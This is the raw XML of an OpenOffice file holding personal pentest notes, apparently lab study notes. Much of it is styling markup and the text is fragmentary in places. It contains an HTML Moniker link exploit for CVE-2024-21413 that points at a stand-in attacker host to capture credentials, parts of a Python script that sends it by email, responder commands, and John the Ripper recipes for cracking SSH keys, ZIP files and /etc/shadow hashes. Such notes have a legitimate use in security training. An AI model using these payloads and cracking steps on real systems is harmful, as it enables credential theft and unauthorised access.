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fo:line-height="120%" style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:name="P12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style:font-name="Arial" fo:font-size="12pt" fo:font-weight="normal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ize="10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0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3" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#1155cc" style:text-line-through-style="none" style:font-name="Arial1" fo:font-size="10pt" fo:font-style="normal" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" style:text-blinking="false" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#1155cc" style:text-line-through-style="none" fo:font-size="10pt" fo:font-style="normal" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" style:text-blinking="false" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#1155cc" style:text-line-through-style="none" style:font-name="Arial" fo:font-size="10pt" fo:font-style="normal" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" style:text-blinking="false" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#1155cc" style:text-line-through-style="none" style:font-name="Arial" fo:font-style="normal" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" style:text-blinking="false" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="T17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1" fo:font-size="10pt" fo:font-style="italic" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties fo:font-size="10pt" fo:font-style="italic" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T21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bookmark text:name="docs-internal-guid-8db46db7-7fff-9afa-d29e-460508373e25"/>MONKIER LINK (CVE-2024-21413)</text:p>
            <text:p text:style-name="P15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5">Example Monkier link in HTML code to send on target to click:</text:p>
            <text:p text:style-name="P16">&lt;a href="file://ATTACKER_IP/test!example"&gt;Click me&lt;/a&gt;.</text:p>
            <text:p text:style-name="P22"/>
            <text:p text:style-name="P16"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21">&lt;p&gt;&lt;a href="file://ATTACKER_MACHINE/test!example"&gt;Click me&lt;/a&gt;&lt;/p&gt;</text:span></text:p>
            <text:p text:style-name="P22"/>
            <text:p text:style-name="P18">    <text:span text:style-name="T21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<text:soft-page-break/>try:</text:p>
            <text:p text:style-name="P18">    <text:span text:style-name="T21">server.login(sender_email, password)</text:span></text:p>
            <text:p text:style-name="P17">except Exception as err:</text:p>
            <text:p text:style-name="P18">    <text:span text:style-name="T21">print(err)</text:span></text:p>
            <text:p text:style-name="P18">    <text:span text:style-name="T21">exit(-1)</text:span></text:p>
            <text:p text:style-name="P17">try:</text:p>
            <text:p text:style-name="P18">    <text:span text:style-name="T21">server.sendmail(sender_email, [receiver_email], message.as_string())</text:span></text:p>
            <text:p text:style-name="P18">    <text:span text:style-name="T21">print("\n Email delivered")</text:span></text:p>
            <text:p text:style-name="P17">except Exception as error:</text:p>
            <text:p text:style-name="P18">    <text:span text:style-name="T21">print(error)</text:span></text:p>
            <text:p text:style-name="P17">finally:</text:p>
            <text:p text:style-name="P18">    <text:span text:style-name="T21">server.quit()</text:span></text:p>
            <text:p text:style-name="P20"><text:span text:style-name="T3"><text:line-break/>With responder tool listen on ens5 network interface:</text:span></text:p>
            <text:p text:style-name="P16">responder -I ens5</text:p>
            <text:p text:style-name="P19"><text:span text:style-name="T4">Run python </text:span><text:a xlink:type="simple" xlink:href="http://exploit.py/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T12">exploit.py</text:span></text:a><text:a xlink:type="simple" xlink:href="http://exploit.py/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T4"><text:line-break/></text:span></text:a><text:span text:style-name="T4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4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18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12"><text:span text:style-name="T2">Crack the SSH private key from id_rsa and brute force hash to get password</text:span><text:span text:style-name="T3">. ssh2john converts the id_rsa private key, which is used to log in to the SSH session, into a hash format that John can work with.</text:span></text:p>
            <text:p text:style-name="P8">python3 /opt/john/ssh2john.py</text:p>
            <text:p text:style-name="P8">ssh2john [id_rsa private key file] &gt; [output file]</text:p>
            <text:p text:style-name="P8">/opt/john/<text:span text:style-name="T1">ssh2john.py FILE.id_rsa &gt; ssh_hash.txt</text:span></text:p>
            <text:p text:style-name="P8">john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt</text:p>
            <text:p text:style-name="P7"/>
            <text:p text:style-name="P9">Zip2john</text:p>
            <text:p text:style-name="P8">Brute force ZIP password protected file. First create hash from zip file.<text:line-break/>zip2john SOMEZIP.zip &gt; ziphash.txt<text:line-break/>Brute force hash zip file for password.</text:p>
            <text:p text:style-name="P8"><text:soft-page-break/>john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt</text:p>
            <text:p text:style-name="P8">john --show ziphash.txt</text:p>
            <text:p text:style-name="P7"/>
            <text:p text:style-name="P9">Custom rules John</text:p>
            <text:p text:style-name="P8">Custom passwords generator.<text:line-break/>In file: /opt/john/john.conf <text:s/>or /etc/john/john.conf <text:s/>create:</text:p>
            <text:p text:style-name="P8">[List.Rules:THMRules] is used to define the name of your rule</text:p>
            <text:p text:style-name="P8">Az: Takes the word and appends it with the characters you define</text:p>
            <text:p text:style-name="P8">A0: Takes the word and prepends it with the characters you define</text:p>
            <text:p text:style-name="P8">c: Capitalises the character positionally</text:p>
            <text:p text:style-name="P8">[0-9]: Will include numbers 0-9</text:p>
            <text:p text:style-name="P8">[0]: Will include only the number 0</text:p>
            <text:p text:style-name="P8">[A-z]: Will include both upper and lowercase</text:p>
            <text:p text:style-name="P8">[A-Z]: Will include only uppercase letters</text:p>
            <text:p text:style-name="P8">[a-z]: Will include only lowercase letters</text:p>
            <text:p text:style-name="P9">Example: [List.Rules:PoloPassword]</text:p>
            <text:p text:style-name="P8">cAz"[0-9] [!£$%@]"</text:p>
            <text:p text:style-name="P8">Utilises the following: c: Capitalises the first letter, Az: Appends to the end of the word, [0-9]: A number in the range 0-9</text:p>
            <text:p text:style-name="P8">[!£$%@]: The password is followed by one of these symbols. <text:line-break/>We cand then call this custom rule with argument using the --rule=PoloPassword flag.</text:p>
            <text:p text:style-name="P10">john --wordlist=[path to wordlist] --rule=PoloPassword [path to hashfile]</text:p>
            <text:p text:style-name="P7"/>
            <text:p text:style-name="P9">UNHASH ROOT USER SHADOW FILE WITH JOHN</text:p>
            <text:p text:style-name="P8">Unshadow /etc/passwd /etc/shadow &gt; passfile.txt</text:p>
            <text:p text:style-name="P8">john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt passfile.txt</text:p>
            <text:p text:style-name="P8">John --show passfile.txt</text:p>
            <text:p text:style-name="P7"/>
            <text:p text:style-name="P9">JOHN THE RIPPER - CRACK HASH</text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T3">john --wordlist=[path to wordlist] --format=[format] [path to hashfile]<text:line-break/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Python hash identifier:</text:span></text:p>
            <text:p text:style-name="P8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1"><text:span text:style-name="T4">Launch hash identifier: python3 </text:span><text:a xlink:type="simple" xlink:href="http://hash-id.py/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T12">hash-id.py</text:span></text:a><text:a xlink:type="simple" xlink:href="http://hash-id.py/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T4"><text:line-break/></text:span></text:a><text:span text:style-name="T4">Search for John formats - check hash formats for md5:</text:span></text:p>
            <text:p text:style-name="P8">john --list=formats | grep -iF "md5"</text:p>
            <text:p text:style-name="P8">Example full command:</text:p>
            <text:p text:style-name="P10">john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash3.txt</text:p>
            <text:p text:style-name="P8">Check cracked hash:</text:p>
            <text:p text:style-name="P10"><text:soft-page-break/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7-21T18:29:30.85</dc:date>
    <dc:creator>Davor </dc:creator>
    <meta:editing-duration>PT19M48S</meta:editing-duration>
    <meta:editing-cycles>3</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.15$Win32 OpenOffice.org_project/4115m2$Build-9813</meta:generator>
    <meta:document-statistic meta:table-count="1" meta:image-count="0" meta:object-count="0" meta:page-count="4" meta:paragraph-count="109" meta:word-count="717" meta:character-count="5324"/>
  </office:meta>
</office:document-meta>
</file>